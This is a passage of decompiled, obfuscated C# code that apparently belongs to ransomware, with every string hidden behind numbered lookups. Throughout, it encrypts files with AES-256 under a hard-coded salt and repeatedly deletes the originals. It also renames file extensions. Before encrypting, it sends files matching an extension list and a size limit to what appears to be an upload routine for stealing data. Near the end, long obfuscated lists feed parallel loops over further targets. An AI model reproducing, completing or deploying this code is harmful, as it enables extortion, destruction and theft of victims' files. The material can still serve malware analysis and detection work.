								{
									PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386528)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386528), getString_0(107389588)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void EPFgKsSOzMWL(string XQJWCNSshjJWZ, string XINFAVmVApXM, byte[] WfBXuKnPzaVBWwx, byte[] uJqjMfeESAdZAx = null)
	{
		try
		{
			if (FGSbbxnupor == getString_0(107396816))
			{
				FileStream fileStream = new FileStream(XQJWCNSshjJWZ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in SkvTXsJINBztMRD)
				{
					if (XQJWCNSshjJWZ.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396816))
					{
						if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), XQJWCNSshjJWZ);
							}
							catch
							{
							}
						}
					}
					else if (XQJWCNSshjJWZ.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396382))
					{
						try
						{
							PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), XQJWCNSshjJWZ);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (XQJWCNSshjJWZ != XINFAVmVApXM)
		{
			File.Move(XQJWCNSshjJWZ, XINFAVmVApXM);
			XQJWCNSshjJWZ = XINFAVmVApXM;
		}
		byte[] bytes = DlKGxPgDEDy.AxAOLtoppUjMDv(File.ReadAllBytes(XQJWCNSshjJWZ), WfBXuKnPzaVBWwx, uJqjMfeESAdZAx);
		File.WriteAllBytes(XQJWCNSshjJWZ, bytes);
		ZxYqzVUoLKX++;
	}

	private static void FzWLEbFhnFTpMlZv(string string_0, string string_1, byte[] byte_0)
	{
		OkjrUMihyzSdFX CS_0024_003C_003E8__locals0 = new OkjrUMihyzSdFX();
		CS_0024_003C_003E8__locals0.yHbNFRqzsT = string_0;
		CS_0024_003C_003E8__locals0.leVGelzJXgDBP = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string leVGelzJXgDBP = CS_0024_003C_003E8__locals0.leVGelzJXgDBP;
			FileStream fileStream = new FileStream(leVGelzJXgDBP, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (uEKpoPMiNFZ == getString_0(107396816))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.yHbNFRqzsT, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.yHbNFRqzsT, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.yHbNFRqzsT, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.leVGelzJXgDBP.Length > 0)
				{
					if (FGSbbxnupor == getString_0(107396816))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.yHbNFRqzsT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in SkvTXsJINBztMRD)
						{
							if (CS_0024_003C_003E8__locals0.yHbNFRqzsT.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396816))
							{
								if (Convert.ToInt32(QBNkovNHjRPLm) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), CS_0024_003C_003E8__locals0.yHbNFRqzsT);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.yHbNFRqzsT.ToLower().EndsWith(item) && eiZgJNzJZhH == getString_0(107396382))
							{
								try
								{
									PpFuqDxUfCPuFpcCn.yOpVYrZhtvsYB(getString_0(107389701), getString_0(107389696), getString_0(107389651), CS_0024_003C_003E8__locals0.yHbNFRqzsT);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.yHbNFRqzsT);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.leVGelzJXgDBP.EndsWith(getString_0(107386528)))
					{
						File.Move(CS_0024_003C_003E8__locals0.leVGelzJXgDBP, CS_0024_003C_003E8__locals0.leVGelzJXgDBP.Replace(getString_0(107386528), getString_0(107389588)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.leVGelzJXgDBP))
							{
								File.Delete(CS_0024_003C_003E8__locals0.leVGelzJXgDBP);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(knClGxGTQzcKgW, getString_0(107387305) + CS_0024_003C_003E8__locals0.yHbNFRqzsT + getString_0(107386487) + ex2.Message + getString_0(107395924));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = cuNspBLQnaiUg;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386978)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source2 = zDWpxjRkhE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (LsSyLAcPVPjhbnX == getString_0(107396816))
		{
			string[] source3 = yURxqNIzRnSLu;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), getString_0(107386908) + string_0 + getString_0(107386899));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!ykfhcMmkJbZl().Contains(getString_0(107386659)))
		{
			mDTyZTitOnZ(oUJkScAGYiOuk);
		}
		else
		{
			List<string> source4 = jWqPIVGpjkE;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					mFLmLCPYHuB(ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107386926))), string_0);
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> mszUcjKHBHsCixH = MszUcjKHBHsCixH;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386869)), string_0);
			};
		}
		Parallel.ForEach(mszUcjKHBHsCixH, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386978)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386933)), getString_0(107386908) + string_0 + getString_0(107386899));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107386926))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107386869)), string_0);
	}

	static thNrRmMEuvdxhHm()
	{
		Strings.CreateGetStringDelegate(typeof(thNrRmMEuvdxhHm));
		ZpbuHbHegKdPsO = getString_0(107389207);
		INlpeyNXGAcMRYsht = null;
		SUzteLfaPqYT = getString_0(107396382);
		rMzUuGRFsemZwV = getString_0(107386884);
		YyCNsMjoVMOoP = new List<string>();
		gPUoUjIToplZ = new List<string>();
		BaTKDxNHIDbb = getString_0(107396382);
		MmaHtQgyFtb = getString_0(107389588);
		zSiinLyeiNOaQic = getString_0(107389588);
		VDLcytKbuzTj = getString_0(107389588);
		HIjpsGdeVCfV = getString_0(107396382);
		wejmwyoQVQUQsU = 0;
		JvLbPnAiNtPFl = getString_0(107396382);
		nsKpUomFAcOz = getString_0(107396382);
		EJPsucdpqfblt = getString_0(107396382);
		BmkGyDPnrHxxK = getString_0(107386839);
		vIxYDZmliTLs = getString_0(107396382);
		hMPfQknjOSgM = getString_0(107396382);
		ffTDkqEJLu = getString_0(107396382);
		PfamhYYvOLt = getString_0(107396382);
		juXcZmnrdh = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107386834)),
			ZvzUuZdcuZvZyuA(getString_0(107386849)),
			ZvzUuZdcuZvZyuA(getString_0(107386824)),
			ZvzUuZdcuZvZyuA(getString_0(107386775)),
			ZvzUuZdcuZvZyuA(getString_0(107386750)),
			ZvzUuZdcuZvZyuA(getString_0(107386757)),
			ZvzUuZdcuZvZyuA(getString_0(107386196)),
			ZvzUuZdcuZvZyuA(getString_0(107386171)),
			ZvzUuZdcuZvZyuA(getString_0(107386178)),
			ZvzUuZdcuZvZyuA(getString_0(107386153)),
			ZvzUuZdcuZvZyuA(getString_0(107386104)),
			ZvzUuZdcuZvZyuA(getString_0(107386079)),
			ZvzUuZdcuZvZyuA(getString_0(107386086))
		};
		cVxpfEOwEmPC = new List<string>();
		NYUHoHeNgYqe = getString_0(107396382);
		PJcFDYQtveZrI = getString_0(107396382);
		jLBsOBsltOMag = getString_0(107396382);
		bTWTPdqAFFpauU = new List<string>();
		VXFFPDYcDmttpVY = getString_0(107396382);
		xUYAQkrpKik = getString_0(107386061);
		AaFKnZpVmxll = getString_0(107396816);
		qynsOdMypTOYNli = getString_0(107396382);
		uKyEStecyhCJqa = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107385980)),
			ZvzUuZdcuZvZyuA(getString_0(107386459)),
			ZvzUuZdcuZvZyuA(getString_0(107386426)),
			ZvzUuZdcuZvZyuA(getString_0(107386393)),
			ZvzUuZdcuZvZyuA(getString_0(107386360)),
			ZvzUuZdcuZvZyuA(getString_0(107386331)),
			ZvzUuZdcuZvZyuA(getString_0(107386306)),
			ZvzUuZdcuZvZyuA(getString_0(107386277)),
			ZvzUuZdcuZvZyuA(getString_0(107385688)),
			ZvzUuZdcuZvZyuA(getString_0(107385623)),
			ZvzUuZdcuZvZyuA(getString_0(107385590)),
			ZvzUuZdcuZvZyuA(getString_0(107385557)),
			ZvzUuZdcuZvZyuA(getString_0(107385524)),
			ZvzUuZdcuZvZyuA(getString_0(107385495)),
			ZvzUuZdcuZvZyuA(getString_0(107385466)),
			ZvzUuZdcuZvZyuA(getString_0(107385937)),
			ZvzUuZdcuZvZyuA(getString_0(107385928)),
			ZvzUuZdcuZvZyuA(getString_0(107385871)),
			ZvzUuZdcuZvZyuA(getString_0(107385790)),
			ZvzUuZdcuZvZyuA(getString_0(107385757)),
			ZvzUuZdcuZvZyuA(getString_0(107385760)),
			ZvzUuZdcuZvZyuA(getString_0(107385175)),
			ZvzUuZdcuZvZyuA(getString_0(107385166)),
			ZvzUuZdcuZvZyuA(getString_0(107385133)),
			ZvzUuZdcuZvZyuA(getString_0(107385052)),
			ZvzUuZdcuZvZyuA(getString_0(107385027)),
			ZvzUuZdcuZvZyuA(getString_0(107384954)),
			ZvzUuZdcuZvZyuA(getString_0(107385437)),
			ZvzUuZdcuZvZyuA(getString_0(107385396)),
			ZvzUuZdcuZvZyuA(getString_0(107385339)),
			ZvzUuZdcuZvZyuA(getString_0(107385274)),
			ZvzUuZdcuZvZyuA(getString_0(107385249)),
			ZvzUuZdcuZvZyuA(getString_0(107384672)),
			ZvzUuZdcuZvZyuA(getString_0(107384623)),
			ZvzUuZdcuZvZyuA(getString_0(107384558)),
			ZvzUuZdcuZvZyuA(getString_0(107384469)),
			ZvzUuZdcuZvZyuA(getString_0(107384436)),
			ZvzUuZdcuZvZyuA(getString_0(107384939)),
			ZvzUuZdcuZvZyuA(getString_0(107384898)),
			ZvzUuZdcuZvZyuA(getString_0(107384821)),
			ZvzUuZdcuZvZyuA(getString_0(107384792)),
			ZvzUuZdcuZvZyuA(getString_0(107384727)),
			ZvzUuZdcuZvZyuA(getString_0(107384718)),
			ZvzUuZdcuZvZyuA(getString_0(107384173)),
			ZvzUuZdcuZvZyuA(getString_0(107384132)),
			ZvzUuZdcuZvZyuA(getString_0(107384051)),
			ZvzUuZdcuZvZyuA(getString_0(107384038)),
			ZvzUuZdcuZvZyuA(getString_0(107383933)),
			ZvzUuZdcuZvZyuA(getString_0(107384400)),
			ZvzUuZdcuZvZyuA(getString_0(107384387)),
			ZvzUuZdcuZvZyuA(getString_0(107384310)),
			ZvzUuZdcuZvZyuA(getString_0(107384301)),
			ZvzUuZdcuZvZyuA(getString_0(107384228)),
			ZvzUuZdcuZvZyuA(getString_0(107384199)),
			ZvzUuZdcuZvZyuA(getString_0(107383614)),
			ZvzUuZdcuZvZyuA(getString_0(107383549)),
			ZvzUuZdcuZvZyuA(getString_0(107383504)),
			ZvzUuZdcuZvZyuA(getString_0(107383475)),
			ZvzUuZdcuZvZyuA(getString_0(107383462)),
			ZvzUuZdcuZvZyuA(getString_0(107383909)),
			ZvzUuZdcuZvZyuA(getString_0(107383880)),
			ZvzUuZdcuZvZyuA(getString_0(107383823)),
			ZvzUuZdcuZvZyuA(getString_0(107383758)),
			ZvzUuZdcuZvZyuA(getString_0(107383717)),
			ZvzUuZdcuZvZyuA(getString_0(107383688)),
			ZvzUuZdcuZvZyuA(getString_0(107383103)),
			ZvzUuZdcuZvZyuA(getString_0(107383054)),
			ZvzUuZdcuZvZyuA(getString_0(107382961)),
			ZvzUuZdcuZvZyuA(getString_0(107382920)),
			ZvzUuZdcuZvZyuA(getString_0(107383355)),
			ZvzUuZdcuZvZyuA(getString_0(107383322)),
			ZvzUuZdcuZvZyuA(getString_0(107383281)),
			ZvzUuZdcuZvZyuA(getString_0(107383236)),
			ZvzUuZdcuZvZyuA(getString_0(107383159)),
			ZvzUuZdcuZvZyuA(getString_0(107382558)),
			ZvzUuZdcuZvZyuA(getString_0(107382541)),
			ZvzUuZdcuZvZyuA(getString_0(107382480)),
			ZvzUuZdcuZvZyuA(getString_0(107382471)),
			ZvzUuZdcuZvZyuA(getString_0(107382406)),
			ZvzUuZdcuZvZyuA(getString_0(107382837)),
			ZvzUuZdcuZvZyuA(getString_0(107382780)),
			ZvzUuZdcuZvZyuA(getString_0(107382747)),
			ZvzUuZdcuZvZyuA(getString_0(107382686)),
			ZvzUuZdcuZvZyuA(getString_0(107382661)),
			ZvzUuZdcuZvZyuA(getString_0(107384469)),
			ZvzUuZdcuZvZyuA(getString_0(107382092)),
			ZvzUuZdcuZvZyuA(getString_0(107382051)),
			ZvzUuZdcuZvZyuA(getString_0(107381962)),
			ZvzUuZdcuZvZyuA(getString_0(107381885)),
			ZvzUuZdcuZvZyuA(getString_0(107382368)),
			ZvzUuZdcuZvZyuA(getString_0(107382343)),
			ZvzUuZdcuZvZyuA(getString_0(107382266)),
			ZvzUuZdcuZvZyuA(getString_0(107382249)),
			ZvzUuZdcuZvZyuA(getString_0(107385339)),
			ZvzUuZdcuZvZyuA(getString_0(107382184)),
			ZvzUuZdcuZvZyuA(getString_0(107381599)),
			ZvzUuZdcuZvZyuA(getString_0(107381574)),
			ZvzUuZdcuZvZyuA(getString_0(107385274)),
			ZvzUuZdcuZvZyuA(getString_0(107381469)),
			ZvzUuZdcuZvZyuA(getString_0(107381452)),
			ZvzUuZdcuZvZyuA(getString_0(107381843)),
			ZvzUuZdcuZvZyuA(getString_0(107381778)),
			ZvzUuZdcuZvZyuA(getString_0(107381761)),
			ZvzUuZdcuZvZyuA(getString_0(107384672)),
			ZvzUuZdcuZvZyuA(getString_0(107381652)),
			ZvzUuZdcuZvZyuA(getString_0(107384436)),
			ZvzUuZdcuZvZyuA(getString_0(107384623)),
			ZvzUuZdcuZvZyuA(getString_0(107381619)),
			ZvzUuZdcuZvZyuA(getString_0(107381050)),
			ZvzUuZdcuZvZyuA(getString_0(107384558)),
			ZvzUuZdcuZvZyuA(getString_0(107381017)),
			ZvzUuZdcuZvZyuA(getString_0(107381000)),
			ZvzUuZdcuZvZyuA(getString_0(107380919)),
			ZvzUuZdcuZvZyuA(getString_0(107385396)),
			ZvzUuZdcuZvZyuA(getString_0(107380894)),
			ZvzUuZdcuZvZyuA(getString_0(107380849)),
			ZvzUuZdcuZvZyuA(getString_0(107381332)),
			ZvzUuZdcuZvZyuA(getString_0(107381303)),
			ZvzUuZdcuZvZyuA(getString_0(107381290)),
			ZvzUuZdcuZvZyuA(getString_0(107381257)),
			ZvzUuZdcuZvZyuA(getString_0(107381200)),
			ZvzUuZdcuZvZyuA(getString_0(107381187)),
			ZvzUuZdcuZvZyuA(getString_0(107381162)),
			ZvzUuZdcuZvZyuA(getString_0(107381121)),
			ZvzUuZdcuZvZyuA(getString_0(107413300)),
			ZvzUuZdcuZvZyuA(getString_0(107413283)),
			ZvzUuZdcuZvZyuA(getString_0(107413226)),
			ZvzUuZdcuZvZyuA(getString_0(107413193)),
			ZvzUuZdcuZvZyuA(getString_0(107413116)),
			ZvzUuZdcuZvZyuA(getString_0(107413595)),
			ZvzUuZdcuZvZyuA(getString_0(107413554)),
			ZvzUuZdcuZvZyuA(getString_0(107385437)),
			ZvzUuZdcuZvZyuA(getString_0(107413283)),
			ZvzUuZdcuZvZyuA(getString_0(107413545)),
			ZvzUuZdcuZvZyuA(getString_0(107413516)),
			ZvzUuZdcuZvZyuA(getString_0(107413487)),
			ZvzUuZdcuZvZyuA(getString_0(107413406)),
			ZvzUuZdcuZvZyuA(getString_0(107413365)),
			ZvzUuZdcuZvZyuA(getString_0(107412792)),
			ZvzUuZdcuZvZyuA(getString_0(107412751)),
			ZvzUuZdcuZvZyuA(getString_0(107412690)),
			ZvzUuZdcuZvZyuA(getString_0(107412657)),
			ZvzUuZdcuZvZyuA(getString_0(107412616)),
			ZvzUuZdcuZvZyuA(getString_0(107413099)),
			ZvzUuZdcuZvZyuA(getString_0(107413022)),
			ZvzUuZdcuZvZyuA(getString_0(107412957)),
			ZvzUuZdcuZvZyuA(getString_0(107412924)),
			ZvzUuZdcuZvZyuA(getString_0(107412911)),
			ZvzUuZdcuZvZyuA(getString_0(107412306)),
			ZvzUuZdcuZvZyuA(getString_0(107412273)),
			ZvzUuZdcuZvZyuA(getString_0(107412260)),
			ZvzUuZdcuZvZyuA(getString_0(107412195)),
			ZvzUuZdcuZvZyuA(getString_0(107412162)),
			ZvzUuZdcuZvZyuA(getString_0(107412089)),
			ZvzUuZdcuZvZyuA(getString_0(107412584)),
			ZvzUuZdcuZvZyuA(getString_0(107385052)),
			ZvzUuZdcuZvZyuA(getString_0(107412555)),
			ZvzUuZdcuZvZyuA(getString_0(107412466)),
			ZvzUuZdcuZvZyuA(getString_0(107412457)),
			ZvzUuZdcuZvZyuA(getString_0(107412380)),
			ZvzUuZdcuZvZyuA(getString_0(107412339)),
			ZvzUuZdcuZvZyuA(getString_0(107411814)),
			ZvzUuZdcuZvZyuA(getString_0(107411753)),
			ZvzUuZdcuZvZyuA(getString_0(107411672)),
			ZvzUuZdcuZvZyuA(getString_0(107411655)),
			ZvzUuZdcuZvZyuA(getString_0(107411598)),
			ZvzUuZdcuZvZyuA(getString_0(107412021)),
			ZvzUuZdcuZvZyuA(getString_0(107412008)),
			ZvzUuZdcuZvZyuA(getString_0(107411935)),
			ZvzUuZdcuZvZyuA(getString_0(107411910)),
			ZvzUuZdcuZvZyuA(getString_0(107385027)),
			ZvzUuZdcuZvZyuA(getString_0(107411293)),
			ZvzUuZdcuZvZyuA(getString_0(107411296)),
			ZvzUuZdcuZvZyuA(getString_0(107411231)),
			ZvzUuZdcuZvZyuA(getString_0(107411190)),
			ZvzUuZdcuZvZyuA(getString_0(107411161)),
			ZvzUuZdcuZvZyuA(getString_0(107385133)),
			ZvzUuZdcuZvZyuA(getString_0(107411120)),
			ZvzUuZdcuZvZyuA(getString_0(107411071)),
			ZvzUuZdcuZvZyuA(getString_0(107411074)),
			ZvzUuZdcuZvZyuA(getString_0(107383880)),
			ZvzUuZdcuZvZyuA(getString_0(107411553)),
			ZvzUuZdcuZvZyuA(getString_0(107411074)),
			ZvzUuZdcuZvZyuA(getString_0(107411524)),
			ZvzUuZdcuZvZyuA(getString_0(107411495)),
			ZvzUuZdcuZvZyuA(getString_0(107411466)),
			ZvzUuZdcuZvZyuA(getString_0(107411385)),
			ZvzUuZdcuZvZyuA(getString_0(107411368)),
			ZvzUuZdcuZvZyuA(getString_0(107410783)),
			ZvzUuZdcuZvZyuA(getString_0(107410754)),
			ZvzUuZdcuZvZyuA(getString_0(107410725)),
			ZvzUuZdcuZvZyuA(getString_0(107410652)),
			ZvzUuZdcuZvZyuA(getString_0(107410639)),
			ZvzUuZdcuZvZyuA(getString_0(107410594)),
			ZvzUuZdcuZvZyuA(getString_0(107410561)),
			ZvzUuZdcuZvZyuA(getString_0(107411016)),
			ZvzUuZdcuZvZyuA(getString_0(107410939)),
			ZvzUuZdcuZvZyuA(getString_0(107410914)),
			ZvzUuZdcuZvZyuA(getString_0(107410881)),
			ZvzUuZdcuZvZyuA(getString_0(107410808)),
			ZvzUuZdcuZvZyuA(getString_0(107410267)),
			ZvzUuZdcuZvZyuA(getString_0(107410206)),
			ZvzUuZdcuZvZyuA(getString_0(107410173)),
			ZvzUuZdcuZvZyuA(getString_0(107410148)),
			ZvzUuZdcuZvZyuA(getString_0(107410075)),
			ZvzUuZdcuZvZyuA(getString_0(107410058)),
			ZvzUuZdcuZvZyuA(getString_0(107410537)),
			ZvzUuZdcuZvZyuA(getString_0(107410456)),
			ZvzUuZdcuZvZyuA(getString_0(107410443)),
			ZvzUuZdcuZvZyuA(getString_0(107410362)),
			ZvzUuZdcuZvZyuA(getString_0(107410349)),
			ZvzUuZdcuZvZyuA(getString_0(107409756)),
			ZvzUuZdcuZvZyuA(getString_0(107409723)),
			ZvzUuZdcuZvZyuA(getString_0(107409682)),
			ZvzUuZdcuZvZyuA(getString_0(107409673)),
			ZvzUuZdcuZvZyuA(getString_0(107409596)),
			ZvzUuZdcuZvZyuA(getString_0(107413365)),
			ZvzUuZdcuZvZyuA(getString_0(107409563)),
			ZvzUuZdcuZvZyuA(getString_0(107409522)),
			ZvzUuZdcuZvZyuA(getString_0(107409977)),
			ZvzUuZdcuZvZyuA(getString_0(107409948)),
			ZvzUuZdcuZvZyuA(getString_0(107409915)),
			ZvzUuZdcuZvZyuA(getString_0(107409882)),
			ZvzUuZdcuZvZyuA(getString_0(107409865)),
			ZvzUuZdcuZvZyuA(getString_0(107409836)),
			ZvzUuZdcuZvZyuA(getString_0(107409247)),
			ZvzUuZdcuZvZyuA(getString_0(107409202)),
			ZvzUuZdcuZvZyuA(getString_0(107409193)),
			ZvzUuZdcuZvZyuA(getString_0(107409104)),
			ZvzUuZdcuZvZyuA(getString_0(107409055)),
			ZvzUuZdcuZvZyuA(getString_0(107409058)),
			ZvzUuZdcuZvZyuA(getString_0(107409493))
		};
		cuNspBLQnaiUg = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107409484)),
			ZvzUuZdcuZvZyuA(getString_0(107409403)),
			ZvzUuZdcuZvZyuA(getString_0(107409386)),
			ZvzUuZdcuZvZyuA(getString_0(107409305)),
			ZvzUuZdcuZvZyuA(getString_0(107409288)),
			ZvzUuZdcuZvZyuA(getString_0(107408711)),
			ZvzUuZdcuZvZyuA(getString_0(107408602)),
			ZvzUuZdcuZvZyuA(getString_0(107408541))
		};
		zDWpxjRkhE = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107408516)),
			ZvzUuZdcuZvZyuA(getString_0(107408995)),
			ZvzUuZdcuZvZyuA(getString_0(107408918)),
			ZvzUuZdcuZvZyuA(getString_0(107408901)),
			ZvzUuZdcuZvZyuA(getString_0(107408868)),
			ZvzUuZdcuZvZyuA(getString_0(107408787)),
			ZvzUuZdcuZvZyuA(getString_0(107408774)),
			ZvzUuZdcuZvZyuA(getString_0(107408229)),
			ZvzUuZdcuZvZyuA(getString_0(107408196)),
			ZvzUuZdcuZvZyuA(getString_0(107408163)),
			ZvzUuZdcuZvZyuA(getString_0(107408130)),
			ZvzUuZdcuZvZyuA(getString_0(107408097)),
			ZvzUuZdcuZvZyuA(getString_0(107408024)),
			ZvzUuZdcuZvZyuA(getString_0(107408015)),
			ZvzUuZdcuZvZyuA(getString_0(107408482)),
			ZvzUuZdcuZvZyuA(getString_0(107408449)),
			ZvzUuZdcuZvZyuA(getString_0(107408376)),
			ZvzUuZdcuZvZyuA(getString_0(107408343)),
			ZvzUuZdcuZvZyuA(getString_0(107408334)),
			ZvzUuZdcuZvZyuA(getString_0(107408293)),
			ZvzUuZdcuZvZyuA(getString_0(107408260)),
			ZvzUuZdcuZvZyuA(getString_0(107407675)),
			ZvzUuZdcuZvZyuA(getString_0(107407642)),
			ZvzUuZdcuZvZyuA(getString_0(107408516)),
			ZvzUuZdcuZvZyuA(getString_0(107407601)),
			ZvzUuZdcuZvZyuA(getString_0(107407592)),
			ZvzUuZdcuZvZyuA(getString_0(107407515)),
			ZvzUuZdcuZvZyuA(getString_0(107407482)),
			ZvzUuZdcuZvZyuA(getString_0(107407953)),
			ZvzUuZdcuZvZyuA(getString_0(107407944)),
			ZvzUuZdcuZvZyuA(getString_0(107407911)),
			ZvzUuZdcuZvZyuA(getString_0(107407838)),
			ZvzUuZdcuZvZyuA(getString_0(107407797)),
			ZvzUuZdcuZvZyuA(getString_0(107408995)),
			ZvzUuZdcuZvZyuA(getString_0(107407788)),
			ZvzUuZdcuZvZyuA(getString_0(107408918)),
			ZvzUuZdcuZvZyuA(getString_0(107407755)),
			ZvzUuZdcuZvZyuA(getString_0(107407210)),
			ZvzUuZdcuZvZyuA(getString_0(107407169)),
			ZvzUuZdcuZvZyuA(getString_0(107407136)),
			ZvzUuZdcuZvZyuA(getString_0(107407063)),
			ZvzUuZdcuZvZyuA(getString_0(107407054)),
			ZvzUuZdcuZvZyuA(getString_0(107407021)),
			ZvzUuZdcuZvZyuA(getString_0(107406988)),
			ZvzUuZdcuZvZyuA(getString_0(107407459)),
			ZvzUuZdcuZvZyuA(getString_0(107407386)),
			ZvzUuZdcuZvZyuA(getString_0(107407345))
		};
		jWqPIVGpjkE = new List<string>
		{
			ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107407336))),
			ZvzUuZdcuZvZyuA(getString_0(107407255)),
			ZvzUuZdcuZvZyuA(getString_0(107406650)),
			ZvzUuZdcuZvZyuA(getString_0(107406553)),
			ZvzUuZdcuZvZyuA(getString_0(107406460)),
